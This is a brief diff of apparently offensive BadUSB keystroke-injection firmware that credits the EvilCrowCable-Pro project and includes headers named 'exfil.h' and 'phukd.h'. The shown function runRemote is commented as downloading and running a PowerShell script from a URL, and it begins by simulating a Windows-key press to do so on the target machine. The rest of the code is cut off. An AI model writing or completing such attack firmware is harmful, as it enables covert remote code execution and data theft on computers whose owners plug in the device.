@@ -1,6 +1,8 @@
 #include "exfil.h"
 #include "phukd.h"
 
+// based on https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware, edited by @kaliiiiiiiiii
+
 void runRemote(char *URL){
   // downloads and runs a powershell script from a url
   Keyboard.press(KEY_LEFT_GUI);
